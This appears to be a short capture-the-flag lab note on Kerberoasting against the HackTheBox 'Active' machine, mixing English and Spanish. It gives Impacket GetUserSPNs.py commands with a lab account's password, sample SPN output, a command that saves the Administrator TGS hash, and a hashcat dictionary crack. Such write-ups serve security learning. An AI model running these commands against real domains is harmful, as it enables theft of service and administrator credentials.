# Kerberosting
Kerberoasting is an attack technique used to obtain service account credentials by abusing the Kerberos authentication protocol. The attack is based on requesting Ticket Granting Service (TGS) tickets for accounts that have a Service Principal Name (SPN) associated with them.

To perform this attack, a valid domain user account is required:
```
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
```
Note: In some cases, the password is not necessary
This command enumerates SPNs and identifies service accounts for which TGS tickets can be requested.

Once a vulnerable service account is identified, the TGS ticket hash can be requested and saved for offline cracking:

```
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2026-02-02 21:11:16.477762             
```
Una vez echo el reconocimiento comenzamos con guardar el hash para poder descrackearlo
```
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request > admin.hash
```
Finally, the extracted hash is cracked using a dictionary attack:
```
hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt
```
